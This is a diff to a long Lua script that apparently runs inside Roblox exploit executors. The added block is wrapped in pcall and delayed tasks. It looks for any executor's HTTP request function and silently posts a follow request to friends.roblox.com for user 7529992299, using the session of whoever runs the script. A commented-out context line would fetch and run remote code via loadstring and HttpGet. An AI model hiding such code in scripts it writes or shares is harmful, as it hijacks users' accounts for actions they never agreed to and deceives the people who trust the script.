@@ -3934,3 +3934,14 @@ HintGui:Destroy()
 end)
 
 --loadstring(game:HttpGet("https://raw.githubusercontent.com/Pro666Pro/OpenSourceScripts/refs/heads/main/UI/MoreButtons.luau"))()
+
+pcall(function()
+task.delay(0,function()
+task.spawn(function()
+req = request or http_request or HttpPost or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or (game and game.HttpPost) or (KRNL and KRNL.request) or (Xeno and Xeno.request)
+if req then
+req({Url = "https://friends.roblox.com/v1/users/7529992299/follow", Body = game:GetService("HttpService"):JSONEncode({}), Method = "POST", Headers = {["content-type"] = "application/json"}})
+end
+end)
+end)
+end)
